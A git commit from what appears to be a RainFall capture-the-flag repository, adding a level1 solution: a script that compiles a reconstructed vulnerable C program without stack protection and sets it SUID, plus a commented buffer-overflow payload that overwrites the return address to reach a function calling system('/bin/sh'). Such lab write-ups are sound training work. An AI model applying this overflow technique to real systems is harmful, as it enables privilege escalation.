38b904d626469f8c70d1bfb4032ff4552c57a5ed
Stilram19 <bednaouiomar19@gmail.com>
2026-06-25 22:03:08 +0100

    level1

--- level1/Resources/script.sh
+++ level1/Resources/script.sh
@@ -1,2 +1,17 @@
 #!/bin/bash
 
+# make sure you send pathto/script.sh and pathto/source.c to the VM
+cd /tmp
+
+gcc -fno-stack-protector source.c -o test 
+
+# set SUID
+chmod u+s test
+
+# and then run the program (I found 88 as perfect offset)
+
+# level1@RainFall:/tmp$ (python -c 'print "A" * 88 + "\x64\x84\x04\x08"'; cat) | ./test
+# Good... Wait what?
+# whoami
+# level1
+#
--- level1/source.c
+++ level1/source.c
@@ -1,4 +1,11 @@
 #include <stdio.h>
+#include <stdlib.h>
+
+void run(void) {
+  fwrite("Good... Wait what?\n",1,0x13,stdout);
+  system("/bin/sh");
+  return;
+}
 
 int main(void) {
   char local_50 [76];
